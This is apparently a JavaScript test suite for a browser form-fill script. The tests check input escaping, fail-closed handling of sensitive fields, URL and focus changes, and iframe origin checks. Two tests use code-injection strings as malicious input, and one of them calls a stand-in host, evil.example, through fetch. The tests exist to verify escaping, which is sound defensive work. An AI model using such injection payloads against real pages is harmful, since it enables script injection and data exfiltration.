import test from 'node:test';import assert from 'node:assert/strict';
import {compileNonSecretFormFill} from './browser-form-script.js';
test('form recipe compiles fixed reviewed program, escaping arbitrary input',()=>{
 const malicious='\"); fetch("https://evil.example"); //';
 const script=compileNonSecretFormFill({fieldIndex:1,text:malicious,expectedUrl:'https://example.org/test'});
 assert.ok(script.includes(JSON.stringify(malicious)));
 assert.ok(script.includes('targetDocument.execCommand'));
 assert.ok(!script.includes('form.submit('));
 assert.throws(()=>compileNonSecretFormFill({fieldIndex:80,text:'abc',expectedUrl:'https://example.org/test'}));
 assert.throws(()=>compileNonSecretFormFill({fieldIndex:1,text:'',expectedUrl:'https://example.org/test'}));
});
import {runInNewContext} from 'node:vm';
test('single page.evaluate inserts once into text field with no submission or code injection',()=>{
 let sends=0,commands=0;
 const field={tagName:'INPUT',type:'text',autocomplete:'',isConnected:true,disabled:false,
   readOnly:false,value:'OLD',focus(){doc.activeElement=this},setSelectionRange(a,b){
     assert.deepEqual([a,b],[0,3]);}};
 const doc={activeElement:null,querySelectorAll:()=>[field],execCommand(name,ui,value){
   assert.equal(name,'insertText');assert.equal(ui,false);commands++;field.value=value;return true;}};
 const suspicious='";send();/*';
 const result=runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:suspicious,expectedUrl:'https://example.org/test'}),{document:doc,location:{href:'https://example.org/test'},send(){sends++}});
 assert.equal(result.ok,true);assert.equal(result.insertedLength,suspicious.length);
 assert.equal(field.value,suspicious);assert.equal(sends,0);assert.equal(commands,1);
 assert.equal(result.submitted,false);
});
test('client script fails closed on unsupported email and secret autocomplete',()=>{
 const field={tagName:'INPUT',type:'email',autocomplete:'',isConnected:true,disabled:false,readOnly:false};
 const doc={querySelectorAll:()=>[field]};
 assert.equal(runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:'safe',expectedUrl:'https://example.org/test'}),{document:doc,location:{href:'https://example.org/test'}}).reason,'field_type_forbidden');
 field.type='text';field.autocomplete='username';
 assert.equal(runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:'safe',expectedUrl:'https://example.org/test'}),{document:doc,location:{href:'https://example.org/test'}}).reason,'sensitive_autocomplete');
});
test('client recipe fails closed if page navigation changes before field evaluation',()=>{
 let calls=0;
 const field={tagName:'INPUT',type:'text',autocomplete:'',isConnected:true,disabled:false,readOnly:false,value:'OLD'};
 const doc={querySelectorAll:()=>{calls++;return[field]}};
 const result=runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:'safe',expectedUrl:'https://example.org/test'}),
  {document:doc,location:{href:'https://example.org/other'}});
 assert.equal(result.reason,'document_url_changed');assert.equal(calls,0);
});
test('client recipe detects a change of document or focus after selection and before inserting',()=>{
 let inserts=0;
 const loc={href:'https://example.org/test'};
 const field={tagName:'INPUT',type:'text',autocomplete:'',isConnected:true,disabled:false,readOnly:false,value:'OLD',
  focus(){doc.activeElement=this},setSelectionRange(){loc.href='https://example.org/other'}};
 const doc={activeElement:null,querySelectorAll:()=>[field],execCommand(){inserts++;return true}};
 const result=runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:'safe',expectedUrl:'https://example.org/test'}),{document:doc,location:loc});
 assert.equal(result.reason,'document_or_focus_changed');assert.equal(inserts,0);assert.equal(field.value,'OLD');
});
test('Core script targets a same-origin iframe without extension RPC modification',()=>{
 const childField={tagName:'INPUT',type:'text',autocomplete:'off',isConnected:true,disabled:false,readOnly:false,value:'OLD',
   focus(){childDoc.activeElement=this},setSelectionRange(){}};
 const childDoc={activeElement:null,location:{origin:'https://demo.example'},querySelectorAll:()=>[childField],execCommand(name,ignored,value){
  assert.equal(name,'insertText');childField.value=value;return true;
 }};
 const frame={isConnected:true,getAttribute:()=>'/inside',contentDocument:childDoc};
 const parent={querySelectorAll:(selector)=>selector==='iframe'?[frame]:[]};
 const out=runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:'fake-123',expectedUrl:'https://demo.example/start',iframeIndex:0,expectedFrameOrigin:'https://demo.example'}),
 {document:parent,location:{href:'https://demo.example/start'},URL});
 assert.equal(out.ok,true);assert.equal(out.iframeIndex,0);assert.equal(childField.value,'fake-123');
});
test('cross-origin iframe refuses without guessing or falling back to main document',()=>{
 const frame={isConnected:true,getAttribute:()=> 'https://auth.example/login',contentDocument:null};
 const doc={querySelectorAll:()=>[frame]};
 const out=runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:'fake',expectedUrl:'https://demo.example/start',iframeIndex:0,expectedFrameOrigin:'https://auth.example'}),
 {document:doc,location:{href:'https://demo.example/start'},URL});
 assert.equal(out.reason,'cross_origin_frame_requires_isolated_world');
});
